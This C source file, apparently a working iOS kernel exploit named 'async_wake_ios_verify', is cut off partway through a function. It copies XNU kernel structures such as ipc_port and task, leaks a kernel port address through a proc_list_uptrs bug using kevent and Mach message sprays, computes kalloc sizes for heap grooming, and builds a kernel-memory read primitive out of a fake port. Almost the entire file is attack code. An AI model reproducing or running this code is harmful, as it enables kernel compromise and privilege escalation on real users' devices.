//
//  main.c
//  async_wake_ios_verify
//
//  Created by GentleKnife on 2018/5/15.
//  Copyright © 2018年 gk. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/event.h>
#include <errno.h>
#include <pthread/pthread.h>

#include <mach/mach.h>
#include <mach/message.h>

#include <IOKit/IOKitLib.h>

struct queue_entry {
    struct queue_entry    *next;        /* next element */
    struct queue_entry    *prev;        /* previous element */
};

typedef struct queue_entry queue_chain_t;

typedef uint8_t sync_qos_count_t;

#define THREAD_QOS_LAST                 7

struct ipc_kmsg {
    mach_msg_size_t            ikm_size;
    struct ipc_kmsg            *ikm_next;        /* next message on port/discard queue */
    struct ipc_kmsg            *ikm_prev;        /* prev message on port/discard queue */
    mach_msg_header_t          *ikm_header;
    void *                 ikm_prealloc;     /* port we were preallocated from */
    void *                 ikm_voucher;      /* voucher port carried */
    mach_msg_priority_t        ikm_qos;          /* qos of this kmsg */
    mach_msg_priority_t        ikm_qos_override; /* qos override on this kmsg */
    struct ipc_importance_elem *ikm_importance;  /* inherited from */
    queue_chain_t              ikm_inheritance;  /* inherited from link */
    sync_qos_count_t sync_qos[THREAD_QOS_LAST];  /* sync qos counters for ikm_prealloc port */
    sync_qos_count_t special_port_qos;           /* special port qos for ikm_prealloc port */
    //#if MACH_FLIPC
    struct mach_node           *ikm_node;        /* Originating node - needed for ack */
    //#endif
};

#define DESC_SIZE_ADJUSTMENT    ((mach_msg_size_t)(sizeof(mach_msg_ool_descriptor64_t) - \
sizeof(mach_msg_ool_descriptor32_t)))

#define    IKM_OVERHEAD        (sizeof(struct ipc_kmsg))
#define    ikm_plus_overhead(size)    ((mach_msg_size_t)((size) + IKM_OVERHEAD))

typedef struct {
    volatile uintptr_t    interlock;
#if    MACH_LDEBUG
    unsigned long   lck_spin_pad[9];    /* XXX - usimple_lock_data_t */
#endif
} lck_spin_t;

typedef natural_t ipc_object_refs_t;    /* for ipc/ipc_object.h        */
typedef natural_t ipc_object_bits_t;

struct ipc_object {
    ipc_object_bits_t io_bits;
    ipc_object_refs_t io_references;
    lck_spin_t    io_lock_data;
};

#define _EVENT_MASK_BITS   ((sizeof(uint32_t) * 8) - 6)

struct hslock {
    uintptr_t    lock_data;
};
typedef struct hslock hw_lock_data_t;

typedef    struct queue_entry    queue_head_t;

struct waitq {
    uint32_t /* flags */
waitq_type:2,    /* only public field */
waitq_fifo:1,    /* fifo wakeup policy? */
waitq_prepost:1, /* waitq supports prepost? */
waitq_irq:1,     /* waitq requires interrupts disabled */
waitq_isvalid:1, /* waitq structure is valid */
waitq_eventmask:_EVENT_MASK_BITS;
    /* the wait queue set (set-of-sets) to which this queue belongs */
    //#if __arm64__
    //    hw_lock_bit_t    waitq_interlock;    /* interlock */
    //#else
    hw_lock_data_t    waitq_interlock;    /* interlock */
    //#endif /* __arm64__ */
    
    uint64_t waitq_set_id;
    uint64_t waitq_prepost_id;
    queue_head_t    waitq_queue;        /* queue of elements */
};

struct ipc_kmsg_queue {
    struct ipc_kmsg *ikmq_base;
};

struct waitq_set {
    struct waitq wqset_q;
    uint64_t     wqset_id;
    union {
        uint64_t     wqset_prepost_id;
        void        *wqset_prepost_hook;
    };
};

typedef struct ipc_mqueue {
    union {
        struct {
            struct  waitq        waitq;
            struct ipc_kmsg_queue    messages;
            mach_port_seqno_t     seqno;
            mach_port_name_t    receiver_name;
            uint16_t        msgcount;
            uint16_t        qlimit;
#if MACH_FLIPC
            struct flipc_port    *fport;    // Null for local port, or ptr to flipc port
#endif
        } port;
        struct {
            struct waitq_set    setq;
        } pset;
    } data;
    struct klist imq_klist;
} *ipc_mqueue_t;


typedef vm_offset_t            ipc_kobject_t;

typedef unsigned int ipc_port_timestamp_t;


typedef struct ipc_importance_task *ipc_importance_task_t;
typedef struct ipc_port *ipc_port_t;

struct ipc_port {
    
    /*
     * Initial sub-structure in common with ipc_pset
     * First element is an ipc_object second is a
     * message queue
     */
    struct ipc_object ip_object;
    struct ipc_mqueue ip_messages;
    
    union {
        struct ipc_space *receiver;
        struct ipc_port *destination;
        ipc_port_timestamp_t timestamp;
    } data;
    
    union {
        ipc_kobject_t kobject;
        ipc_importance_task_t imp_task;
        ipc_port_t sync_qos_override_port;
    } kdata;
    
    struct ipc_port *ip_nsrequest;
    struct ipc_port *ip_pdrequest;
    struct ipc_port_request *ip_requests;
    union {
        struct ipc_kmsg *premsg;
        struct {
            sync_qos_count_t sync_qos[THREAD_QOS_LAST];
            sync_qos_count_t special_port_qos;
        } qos_counter;
    } kdata2;
    
    mach_vm_address_t ip_context;
    
    natural_t ip_sprequests:1,    /* send-possible requests outstanding */
ip_spimportant:1,    /* ... at least one is importance donating */
ip_impdonation:1,    /* port supports importance donation */
ip_tempowner:1,    /* dont give donations to current receiver */
ip_guarded:1,         /* port guarded (use context value as guard) */
ip_strict_guard:1,    /* Strict guarding; Prevents user manipulation of context values directly */
ip_specialreply:1,    /* port is a special reply port */
ip_link_sync_qos:1,    /* link the special reply port to destination port */
ip_impcount:24;    /* number of importance donations in nested queue */
    
    mach_port_mscount_t ip_mscount;
    mach_port_rights_t ip_srights;
    mach_port_rights_t ip_sorights;
    
#if    MACH_ASSERT
#define    IP_NSPARES        4
#define    IP_CALLSTACK_MAX    16
    /*    queue_chain_t    ip_port_links;*//* all allocated ports */
    thread_t    ip_thread;    /* who made me?  thread context */
    unsigned long    ip_timetrack;    /* give an idea of "when" created */
    uintptr_t    ip_callstack[IP_CALLSTACK_MAX]; /* stack trace */
    unsigned long    ip_spares[IP_NSPARES]; /* for debugging */
#endif    /* MACH_ASSERT */
};

struct kevent_qos_s {
    uint64_t        ident;          /* identifier for this event */
    int16_t         filter;         /* filter for event */
    uint16_t        flags;          /* general flags */
    uint32_t        qos;            /* quality of service when servicing event */
    uint64_t        udata;          /* opaque user data identifier */
    uint32_t        fflags;         /* filter-specific flags */
    uint32_t        xflags;         /* extra filter-specific flags */
    int64_t         data;           /* filter-specific data */
    uint64_t        ext[4];         /* filter-specific extensions */
};

#define    IO_BITS_ACTIVE        0x80000000    /* is object alive? */

#define    IKOT_NONE                0
#define    IKOT_TASK                2

#define ip_bits            ip_object.io_bits
#define ip_references        ip_object.io_references
#define    ip_receiver        data.receiver
#define ip_kobject        kdata.kobject

struct _cpu_time_qos_stats {
    uint64_t cpu_time_qos_default;
    uint64_t cpu_time_qos_maintenance;
    uint64_t cpu_time_qos_background;
    uint64_t cpu_time_qos_utility;
    uint64_t cpu_time_qos_legacy;
    uint64_t cpu_time_qos_user_initiated;
    uint64_t cpu_time_qos_user_interactive;
};

#define decl_lck_mtx_data(class,name)     class lck_mtx_t name;

typedef struct sched_group              *sched_group_t;

typedef struct _lck_mtx_ {
    union {
        struct {
            volatile uintptr_t        lck_mtx_owner;
            union {
                struct {
                    volatile uint32_t
                lck_mtx_waiters:16,
                lck_mtx_pri:8,
                lck_mtx_ilocked:1,
                lck_mtx_mlocked:1,
                lck_mtx_promoted:1,
                lck_mtx_spin:1,
                lck_mtx_is_ext:1,
                lck_mtx_pad3:3;
                };
                uint32_t    lck_mtx_state;
            };
            /* Pad field used as a canary, initialized to ~0 */
            uint32_t            lck_mtx_pad32;
        };
        struct {
            struct _lck_mtx_ext_        *lck_mtx_ptr;
            uint32_t            lck_mtx_tag;
            uint32_t            lck_mtx_pad32_2;
        };
    };
} lck_mtx_t;

struct exception_action {
    struct ipc_port        *port;        /* exception port */
    thread_state_flavor_t    flavor;        /* state flavor to send */
    exception_behavior_t    behavior;    /* exception type to raise */
    boolean_t        privileged;    /* survives ipc_task_reset */
    struct label        *label;        /* MAC label associated with action */
};

typedef enum {
    UNDEFINED,
    FP,
    AVX,
#if !defined(RC_HIDE_XNU_J137)
    AVX512
#endif
} xstate_t;

#define MACHINE_TASK                \
struct user_ldt *       i386_ldt;    \
void*             task_debug;    \
uint64_t    uexc_range_start;    \
uint64_t    uexc_range_size;    \
uint64_t    uexc_handler;        \
xstate_t    xstate;

typedef struct kcdata_descriptor * kcdata_descriptor_t;

typedef struct thread_call *thread_call_t;

#define COALITION_TYPE_MAX       (1)

#define COALITION_NUM_TYPES      (COALITION_TYPE_MAX + 1)

struct task_requested_policy {
    uint64_t        trp_int_darwinbg        :1,     /* marked as darwinbg via setpriority */
    trp_ext_darwinbg        :1,
    trp_int_iotier          :2,     /* IO throttle tier */
    trp_ext_iotier          :2,
    trp_int_iopassive       :1,     /* should IOs cause lower tiers to be throttled */
    trp_ext_iopassive       :1,
    trp_bg_iotier           :2,     /* what IO throttle tier should apply to me when I'm darwinbg? (pushed to threads) */
    trp_terminated          :1,     /* all throttles should be removed for quick exit or SIGTERM handling */
    trp_base_latency_qos    :3,     /* Timer latency QoS */
    trp_base_through_qos    :3,     /* Computation throughput QoS */
    
    trp_apptype             :3,     /* What apptype did launchd tell us this was (inherited) */
    trp_boosted             :1,     /* Has a non-zero importance assertion count */
    trp_role                :3,     /* task's system role */
    trp_tal_enabled         :1,     /* TAL mode is enabled */
    trp_over_latency_qos    :3,     /* Timer latency QoS override */
    trp_over_through_qos    :3,     /* Computation throughput QoS override */
    trp_sfi_managed         :1,     /* SFI Managed task */
    trp_qos_clamp           :3,     /* task qos clamp */
    
    /* suppression policies (non-embedded only) */
    trp_sup_active          :1,     /* Suppression is on */
    trp_sup_lowpri_cpu      :1,     /* Wants low priority CPU (MAXPRI_THROTTLE) */
    trp_sup_timer           :3,     /* Wanted timer throttling QoS tier */
    trp_sup_disk            :1,     /* Wants disk throttling */
    trp_sup_throughput      :3,     /* Wants throughput QoS tier */
    trp_sup_cpu             :1,     /* Wants suppressed CPU priority (MAXPRI_SUPPRESSED) */
    trp_sup_bg_sockets      :1,     /* Wants background sockets */
    
    trp_reserved            :18;
};

struct task_effective_policy {
    uint64_t        tep_darwinbg            :1,     /* marked as 'background', and sockets are marked bg when created */
    tep_lowpri_cpu          :1,     /* cpu priority == MAXPRI_THROTTLE */
    tep_io_tier             :2,     /* effective throttle tier */
    tep_io_passive          :1,     /* should IOs cause lower tiers to be throttled */
    tep_all_sockets_bg      :1,     /* All existing sockets in process are marked as bg (thread: all created by thread) */
    tep_new_sockets_bg      :1,     /* Newly created sockets should be marked as bg */
    tep_bg_iotier           :2,     /* What throttle tier should I be in when darwinbg is set? */
    tep_terminated          :1,     /* all throttles have been removed for quick exit or SIGTERM handling */
    tep_qos_ui_is_urgent    :1,     /* bump UI-Interactive QoS up to the urgent preemption band */
    tep_latency_qos         :3,     /* Timer latency QoS level */
    tep_through_qos         :3,     /* Computation throughput QoS level */
    
    tep_tal_engaged         :1,     /* TAL mode is in effect */
    tep_watchers_bg         :1,     /* watchers are BG-ed */
    tep_sup_active          :1,     /* suppression behaviors are in effect */
    tep_role                :3,     /* task's system role */
    tep_suppressed_cpu      :1,     /* cpu priority == MAXPRI_SUPPRESSED (trumped by lowpri_cpu) */
    tep_sfi_managed         :1,     /* SFI Managed task */
    tep_live_donor          :1,     /* task is a live importance boost donor */
    tep_qos_clamp           :3,     /* task qos clamp (applies to qos-disabled threads too) */
    tep_qos_ceiling         :3,     /* task qos ceiling (applies to only qos-participating threads) */
    
    tep_reserved            :32;
};

struct task {
    /* Synchronization/destruction information */
    decl_lck_mtx_data(,lock)        /* Task's lock */
    _Atomic uint32_t    ref_count;    /* Number of references to me */
    boolean_t    active;        /* Task has not been terminated */
    boolean_t    halting;    /* Task is being halted */
    
    /* Miscellaneous */
    uint64_t    map;        /* Address space description */
    queue_chain_t    tasks;    /* global list of tasks */
    void        *user_data;    /* Arbitrary data settable via IPC */
    
    //#if defined(CONFIG_SCHED_MULTIQ)
    sched_group_t sched_group;
    //#endif /* defined(CONFIG_SCHED_MULTIQ) */
    
    /* Threads in this task */
    queue_head_t        threads;
    
    processor_set_t        pset_hint;
    struct affinity_space    *affinity_space;
    
    int            thread_count;
    uint32_t        active_thread_count;
    int            suspend_count;    /* Internal scheduling only */
    
    /* User-visible scheduling information */
    integer_t        user_stop_count;    /* outstanding stops */
    integer_t        legacy_stop_count;    /* outstanding legacy stops */
    
    integer_t        priority;            /* base priority for threads */
    integer_t        max_priority;        /* maximum priority for threads */
    
    integer_t        importance;        /* priority offset (BSD 'nice' value) */
    
    /* Task security and audit tokens */
    security_token_t sec_token;
    audit_token_t    audit_token;
    
    /* Statistics */
    uint64_t        total_user_time;    /* terminated threads only */
    uint64_t        total_system_time;
    uint64_t        total_ptime;
    
    /* Virtual timers */
    uint32_t        vtimers;
    
    /* IPC structures */
    decl_lck_mtx_data(,itk_lock_data)
    struct ipc_port *itk_self;    /* not a right, doesn't hold ref */
    struct ipc_port *itk_nself;    /* not a right, doesn't hold ref */
    struct ipc_port *itk_sself;    /* a send right */
    struct exception_action exc_actions[EXC_TYPES_COUNT];
    /* a send right each valid element  */
    struct ipc_port *itk_host;    /* a send right */
    struct ipc_port *itk_bootstrap;    /* a send right */
    struct ipc_port *itk_seatbelt;    /* a send right */
    struct ipc_port *itk_gssd;    /* yet another send right */
    struct ipc_port *itk_debug_control; /* send right for debugmode communications */
    struct ipc_port *itk_task_access; /* and another send right */
    struct ipc_port *itk_resume;    /* a receive right to resume this task */
    struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
    /* all send rights */
    
    struct ipc_space *itk_space;
    
    /* Synchronizer ownership information */
    queue_head_t    semaphore_list;        /* list of owned semaphores   */
    int        semaphores_owned;    /* number of semaphores owned */
    
    uint64_t    ledger;
    
    unsigned int    priv_flags;            /* privilege resource flags */
#define VM_BACKING_STORE_PRIV    0x1
    
    MACHINE_TASK
    
    integer_t faults;              /* faults counter */
    integer_t pageins;             /* pageins counter */
    integer_t cow_faults;          /* copy on write fault counter */
    integer_t messages_sent;       /* messages sent counter */
    integer_t messages_received;   /* messages received counter */
    integer_t syscalls_mach;       /* mach system call counter */
    integer_t syscalls_unix;       /* unix system call counter */
    uint32_t  c_switch;               /* total context switches */
    uint32_t  p_switch;               /* total processor switches */
    uint32_t  ps_switch;           /* total pset switches */
    
    //#ifdef  MACH_BSD
    void *bsd_info;
    //#endif
    kcdata_descriptor_t        corpse_info;
    uint64_t            crashed_thread_id;
    queue_chain_t            corpse_tasks;
    //#ifdef CONFIG_MACF
    struct label *            crash_label;
    //#endif
    struct vm_shared_region        *shared_region;
    volatile uint32_t t_flags;                                      /* general-purpose task flags protected by task_lock (TL) */
#define TF_NONE                 0
#define TF_64B_ADDR             0x00000001                              /* task has 64-bit addressing */
#define TF_64B_DATA             0x00000002                              /* task has 64-bit data registers */
#define TF_CPUMON_WARNING       0x00000004                              /* task has at least one thread in CPU usage warning zone */
#define TF_WAKEMON_WARNING      0x00000008                              /* task is in wakeups monitor warning zone */
#define TF_TELEMETRY            (TF_CPUMON_WARNING | TF_WAKEMON_WARNING) /* task is a telemetry participant */
#define TF_GPU_DENIED           0x00000010                              /* task is not allowed to access the GPU */
#define TF_CORPSE               0x00000020                              /* task is a corpse */
#define TF_PENDING_CORPSE       0x00000040                              /* task corpse has not been reported yet */
#define TF_CORPSE_FORK          0x00000080                              /* task is a forked corpse */
#define TF_LRETURNWAIT          0x00000100                              /* task is waiting for fork/posix_spawn/exec to complete */
#define TF_LRETURNWAITER        0x00000200                              /* task is waiting for TF_LRETURNWAIT to get cleared */
#define TF_PLATFORM             0x00000400                              /* task is a platform binary */
    
#define task_has_64BitAddr(task)    \
(((task)->t_flags & TF_64B_ADDR) != 0)
#define task_set_64BitAddr(task)    \
((task)->t_flags |= TF_64B_ADDR)
#define task_clear_64BitAddr(task)    \
((task)->t_flags &= ~TF_64B_ADDR)
#define task_has_64BitData(task)    \
(((task)->t_flags & TF_64B_DATA) != 0)
    
#define task_is_a_corpse(task)      \
(((task)->t_flags & TF_CORPSE) != 0)
    
#define task_set_corpse(task)       \
((task)->t_flags |= TF_CORPSE)
    
#define task_corpse_pending_report(task)     \
(((task)->t_flags & TF_PENDING_CORPSE) != 0)
    
#define task_set_corpse_pending_report(task)       \
((task)->t_flags |= TF_PENDING_CORPSE)
    
#define task_clear_corpse_pending_report(task)       \
((task)->t_flags &= ~TF_PENDING_CORPSE)
    
#define task_is_a_corpse_fork(task)    \
(((task)->t_flags & TF_CORPSE_FORK) != 0)
    
    uint32_t t_procflags;                                            /* general-purpose task flags protected by proc_lock (PL) */
#define TPF_NONE                 0
#define TPF_DID_EXEC             0x00000001                              /* task has been execed to a new task */
#define TPF_EXEC_COPY            0x00000002                              /* task is the new copy of an exec */
    
#define task_did_exec_internal(task)        \
(((task)->t_procflags & TPF_DID_EXEC) != 0)
    
#define task_is_exec_copy_internal(task)    \
(((task)->t_procflags & TPF_EXEC_COPY) != 0)
    
    mach_vm_address_t    all_image_info_addr; /* dyld __all_image_info     */
    mach_vm_size_t        all_image_info_size; /* section location and size */
    
    //#if KPERF
#define TASK_PMC_FLAG            0x1    /* Bit in "t_chud" signifying PMC interest */
#define TASK_KPC_FORCED_ALL_CTRS    0x2    /* Bit in "t_chud" signifying KPC forced all counters */
    
    uint32_t t_chud;        /* CHUD flags, used for Shark */
    //#endif
    
    boolean_t pidsuspended; /* pid_suspend called; no threads can execute */
    boolean_t frozen;       /* frozen; private resident pages committed to swap */
    boolean_t changing_freeze_state;    /* in the process of freezing or thawing */
    uint16_t policy_ru_cpu          :4,
    policy_ru_cpu_ext      :4,
    applied_ru_cpu         :4,
    applied_ru_cpu_ext     :4;
    uint8_t  rusage_cpu_flags;
    uint8_t  rusage_cpu_percentage;        /* Task-wide CPU limit percentage */
    uint64_t rusage_cpu_interval;        /* Task-wide CPU limit interval */
    uint8_t  rusage_cpu_perthr_percentage;  /* Per-thread CPU limit percentage */
    uint64_t rusage_cpu_perthr_interval;    /* Per-thread CPU limit interval */
    uint64_t rusage_cpu_deadline;
    thread_call_t rusage_cpu_callt;
#if CONFIG_EMBEDDED
    queue_head_t    task_watchers;        /* app state watcher threads */
    int    num_taskwatchers;
    int        watchapplying;
#endif /* CONFIG_EMBEDDED */
    
    //#if CONFIG_ATM
    struct atm_task_descriptor *atm_context;  /* pointer to per task atm descriptor */
    //#endif
    struct bank_task *bank_context;  /* pointer to per task bank structure */
    
    //#if IMPORTANCE_INHERITANCE
    struct ipc_importance_task  *task_imp_base;    /* Base of IPC importance chain */
    //#endif /* IMPORTANCE_INHERITANCE */
    
    vm_extmod_statistics_data_t    extmod_statistics;
    
    //#if MACH_ASSERT
    int8_t        suspends_outstanding;    /* suspends this task performed in excess of resumes */
    //#endif
    
    struct task_requested_policy requested_policy;
    struct task_effective_policy effective_policy;
    
    /*
     * Can be merged with imp_donor bits, once the IMPORTANCE_INHERITANCE macro goes away.
     */
    uint32_t        low_mem_notified_warn        :1,    /* warning low memory notification is sent to the task */
    low_mem_notified_critical    :1,    /* critical low memory notification is sent to the task */
    purged_memory_warn        :1,    /* purgeable memory of the task is purged for warning level pressure */
    purged_memory_critical        :1,    /* purgeable memory of the task is purged for critical level pressure */
    low_mem_privileged_listener    :1,    /* if set, task would like to know about pressure changes before other tasks on the system */
    mem_notify_reserved        :27;    /* reserved for future use */
    
    uint32_t memlimit_is_active                 :1, /* if set, use active attributes, otherwise use inactive attributes */
    memlimit_is_fatal                   :1, /* if set, exceeding current memlimit will prove fatal to the task */
    memlimit_active_exc_resource        :1, /* if set, suppress exc_resource exception when task exceeds active memory limit */
    memlimit_inactive_exc_resource      :1, /* if set, suppress exc_resource exception when task exceeds inactive memory limit */
    memlimit_attrs_reserved             :28; /* reserved for future use */
    
    io_stat_info_t         task_io_stats;
    uint64_t         task_immediate_writes __attribute__((aligned(8)));
    uint64_t         task_deferred_writes __attribute__((aligned(8)));
    uint64_t         task_invalidated_writes __attribute__((aligned(8)));
    uint64_t         task_metadata_writes __attribute__((aligned(8)));
    
    /*
     * The cpu_time_qos_stats fields are protected by the task lock
     */
    struct _cpu_time_qos_stats     cpu_time_qos_stats;
    
    /* Statistics accumulated for terminated threads from this task */
    uint32_t    task_timer_wakeups_bin_1;
    uint32_t    task_timer_wakeups_bin_2;
    uint64_t    task_gpu_ns;
    uint64_t    task_energy;
    
#if MONOTONIC
    /* Read and written under task_lock */
    struct mt_task task_monotonic;
#endif /* MONOTONIC */
    
    /* # of purgeable volatile VM objects owned by this task: */
    int        task_volatile_objects;
    /* # of purgeable but not volatile VM objects owned by this task: */
    int        task_nonvolatile_objects;
    boolean_t    task_purgeable_disowning;
    boolean_t    task_purgeable_disowned;
    
    /*
     * A task's coalition set is "adopted" in task_create_internal
     * and unset in task_deallocate_internal, so each array member
     * can be referenced without the task lock.
     * Note: these fields are protected by coalition->lock,
     *       not the task lock.
     */
    coalition_t    coalition[COALITION_NUM_TYPES];
    queue_chain_t   task_coalition[COALITION_NUM_TYPES];
    uint64_t        dispatchqueue_offset;
    
#if DEVELOPMENT || DEBUG
    boolean_t    task_unnested;
    int        task_disconnected_count;
#endif
    
    //#if HYPERVISOR
    void *hv_task_target; /* hypervisor virtual machine object associated with this task */
    //#endif /* HYPERVISOR */
    
    //#if CONFIG_SECLUDED_MEMORY
    boolean_t    task_can_use_secluded_mem;
    boolean_t    task_could_use_secluded_mem;
    boolean_t    task_could_also_use_secluded_mem;
    //#endif /* CONFIG_SECLUDED_MEMORY */
    
    queue_head_t    io_user_clients;
    uint32_t    exec_token;
};

typedef natural_t ipc_space_refs_t;

typedef natural_t ipc_table_elems_t;    /* size of tables */
typedef ipc_table_elems_t ipc_entry_num_t;    /* number of entries */

typedef struct ipc_entry *ipc_entry_t;

struct ipc_space {
    lck_spin_t    is_lock_data;
    ipc_space_refs_t is_bits;    /* holds refs, active, growing */
    ipc_entry_num_t is_table_size;    /* current size of table */
    ipc_entry_num_t is_table_free;    /* count of free elements */
    ipc_entry_t is_table;        /* an array of entries */
    task_t is_task;                 /* associated task */
    struct ipc_table_size *is_table_next; /* info for larger table */
    ipc_entry_num_t is_low_mod;    /* lowest modified entry during growth */
    ipc_entry_num_t is_high_mod;    /* highest modified entry during growth */
    int is_node_id;            /* HOST_LOCAL_NODE, or remote node if proxy space */
};

typedef natural_t ipc_entry_bits_t;
typedef mach_port_name_t mach_port_index_t;        /* index values */
typedef natural_t ipc_table_index_t;    /* index into tables */

struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
        mach_port_index_t next;        /* next in freelist, or...  */
        ipc_table_index_t request;    /* dead name request notify */
    } index;
};

typedef struct hslock *hw_lock_t;

int kevent_id(uint64_t id, const struct kevent_qos_s *changelist, int nchanges, struct kevent_qos_s *eventlist, int nevents, void *data_out, size_t *data_available, unsigned int flags);

int proc_list_uptrs(pid_t pid, uint64_t *buffer, uint32_t buffersize);

static int uint64_t_compare(const void* a, const void* b) {
    
    uint64_t a_val = (*(uint64_t*)a);
    uint64_t b_val = (*(uint64_t*)b);
    
    if (a_val < b_val) {
        
        return -1;
    } else if (a_val == b_val) {
        
        return 0;
    }
    
    return 1;
}

uint64_t port_kaddr_via_proc_pidlistuptrs_bug(mach_port_t target_port, mach_msg_type_name_t disposition) {
    
    // append enough users events to triger kevent_proc_copy_uptrs cut down copy size to our buff size((x mod 8) + 7), which result in get extra 7 bytes
    
    static bool kevent_allocated = false;
    
    if (kevent_allocated == false) {
        
        struct kevent_qos_s events_id[] = {
            {
                .filter = EVFILT_USER,
                .ident = 1,
                .flags = EV_ADD,
                .udata = 0x2345
            }
        };
        
#define KEVENT_FLAG_WORKLOOP 0x400
        
        for (size_t i = 0; i < 10000; i++) {
            
            if (kevent_id(0x1234, events_id, 1, NULL, 0, NULL, NULL, KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE) != 0) {
                
                printf("exit line %d\n", __LINE__);
                exit(-1);
            }
            
            events_id[0].ident++;
        }
        
        kevent_allocated = true;
    }
    
    // allocate various self task ports array size and reallocate the same size after free to leak self task port addr
    
    mach_port_t ports[100];
    
    struct ool_ports_msg {
        
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_ports;
    }msg;
    
    uint64_t uptrs_buff[100];
    
    uint64_t guess_port_addr[100];
    uint32_t guess_port_num = 0;
    
    for (uint i = 1; i <= 100; i++) {
        
        mach_port_t port;
        
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
        
        for(uint j = 0; j < i; j++) {
            
            ports[j] = target_port;
        }
        
        memset(&msg, 0, sizeof(struct ool_ports_msg));
        
        msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        //msg->header.msgh_size =      we do not need it when send
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x41414141;
        
        msg.body.msgh_descriptor_count = 1;
        
        msg.ool_ports.address = ports;
        msg.ool_ports.count = i;
        msg.ool_ports.deallocate = FALSE;
        msg.ool_ports.disposition = disposition;
        msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
        
        if (mach_msg(&msg.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(struct ool_ports_msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
        
        mach_port_destroy(mach_task_self(), port);
        
        memset(uptrs_buff, 0, sizeof(uint64_t) * i);
        
        if (proc_list_uptrs(getpid(), uptrs_buff, i * 8 - 1) == -1) {
            
            continue;
        }
        
        if (uptrs_buff[i - 1] < 0x00ffffff00000000 && uptrs_buff[i - 1] > 0x00ffff0000000000) {
            
            guess_port_addr[guess_port_num++] = uptrs_buff[i - 1];
        }
        
    }
    
    if (guess_port_num == 0) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    qsort(guess_port_addr, guess_port_num, sizeof(uint64_t), uint64_t_compare);
    
    uint64_t current_port_addr = 0, current_port_num = 0, best_port_addr = guess_port_addr[0], best_port_num = 1;
    
    for(uint i = 0; i < guess_port_num; i++) {
        
        if (current_port_addr != guess_port_addr[i]) {
            
            current_port_addr = guess_port_addr[i];
            current_port_num = 1;
        } else {
            
            current_port_num++;
            
            if (current_port_num > best_port_num) {
                
                best_port_num = current_port_num;
                best_port_addr = current_port_addr;
            }
        }
    }
    
    return best_port_addr | 0xff00000000000000;
}

uint32_t msg_header_and_data_size_for_kalloc(uint32_t kalloc_size) {
    //x = msg_header + msg_data + msg_trailer
    //y = kalloc_size
    //(((x) - MAX_TRAILER_SIZE) - sizeof(mach_msg_base_t)) / sizeof(mach_msg_ool_descriptor32_t) *
    //DESC_SIZE_ADJUSTMENT + (x) + sizeof(struct ipc_kmsg) = y
    //(x - 96) / 3 + x + 96 = y
    //x = y * 3 / 4 - 48
    //msg_header + msg_data = y * 3 / 4 - 48 - MAX_TRAILER_SIZE
    //msg_header + msg_data = y * 3 / 4 - 116
    
    return kalloc_size * 3 / 4 - 0x74;
}

uint32_t kalloc_size_for_msg_and_trailer(mach_msg_size_t msg_and_trailer_size) {
    
    mach_msg_size_t size = msg_and_trailer_size - MAX_TRAILER_SIZE;
    
    mach_msg_size_t max_desc = (mach_msg_size_t)(((size - sizeof(mach_msg_base_t)) /
                                                  sizeof(mach_msg_ool_descriptor32_t)) *
                                                 DESC_SIZE_ADJUSTMENT);
    
    mach_msg_size_t max_expanded_size = msg_and_trailer_size + max_desc;
    
    return ikm_plus_overhead(max_expanded_size);
}

mach_port_t send_bunch_msg(uint8_t *msg_data, uint32_t msg_data_size) {
    
    mach_port_t port;
    
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    mach_port_limits_t limits = {0};
    
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    
    if (mach_port_set_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    uint8_t *msg = calloc(sizeof(mach_msg_header_t) + msg_data_size, 1);
    
    mach_msg_header_t *header = (mach_msg_header_t *)msg;
    
    header->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    //header->msgh_size = field not need when send
    header->msgh_remote_port = port;
    header->msgh_local_port = MACH_PORT_NULL;
    header->msgh_id = 0x41414142;
    
    memcpy(msg + sizeof(mach_msg_header_t), msg_data, msg_data_size);
    
    for (uint j = 0; j < 256; j++) {
        
        if (mach_msg(header, MACH_SEND_MSG|MACH_MSG_OPTION_NONE, sizeof(mach_msg_header_t) + msg_data_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) != KERN_SUCCESS) {
            
            printf("exit line %d\n", __LINE__);
            exit(-1);
        }
    }
    
    free(msg);
    
    return port;
}

uint32_t rk32_via_fake_port(mach_port_t fake_port, uint64_t kaddr) {
    
    if (fake_port == MACH_PORT_NULL) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    // 0x10 is p_pid offset of struct proc
    mach_port_context_t context = kaddr - 0x10;
    
    if (mach_port_set_context(mach_task_self(), fake_port, context) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
        exit(-1);
    }
    
    uint32_t var;
    
    if (pid_for_task(fake_port, (int *)&var) != KERN_SUCCESS) {
        
        printf("exit line %d\n", __LINE__);
